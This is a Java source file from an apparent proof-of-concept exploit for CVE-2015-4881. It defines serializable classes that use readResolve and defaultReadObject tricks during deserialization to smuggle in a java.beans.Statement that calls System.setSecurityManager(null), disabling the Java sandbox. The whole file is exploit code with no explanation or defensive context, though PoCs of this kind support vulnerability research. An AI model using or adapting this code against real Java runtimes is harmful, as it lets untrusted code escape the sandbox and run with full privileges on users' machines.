package poc.cve_2015_4881;

import java.beans.Statement;
import java.io.ObjectInputStream;
import java.io.Serializable;

public class SerialStatement extends Statement {

	public static Statement INSTANCE = new ProxyStatement( );
	
	protected SerialStatement( ) {
		super( System.class, "setSecurityManager", new Object[ ] { null } );
	}
	
	private static class ProxyStatement extends SerialStatement implements Serializable {
		
		private static final long serialVersionUID = 6452436114150369368L;

		public Object readResolve( ) {
			return SerialStatement.INSTANCE;
		}
		
	}
	
	private static class DefaultReadObject {
		
		public DefaultReadObject( ) {
			try {
				Main.OI_INSTANCE.defaultReadObject();
			}
			catch( Throwable t ) { }
		}
		
	}
	
	public static class Holder extends DefaultReadObject implements Serializable  {

		private static final long serialVersionUID = 5014270130655725030L;
		
		
		public Statement statement = SerialStatement.INSTANCE;
		
		private void readObject( ObjectInputStream oo ) { }
		
	}
}
